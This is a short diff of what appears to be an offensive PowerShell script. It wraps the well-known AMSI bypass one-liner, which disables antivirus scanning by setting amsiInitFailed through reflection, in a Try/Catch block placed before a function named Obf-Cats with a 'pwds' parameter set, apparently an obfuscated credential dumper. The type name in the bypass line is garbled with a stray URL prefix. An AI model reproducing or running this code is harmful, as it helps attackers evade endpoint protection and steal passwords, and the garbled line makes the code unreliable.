@@ -1,4 +1,10 @@
-[Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+Try
+{
+	[Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+}
+Catch
+{}
+
 function Obf-Cats
 {
 [CmdletBinding(DefaultParameterSetName="pwds")]
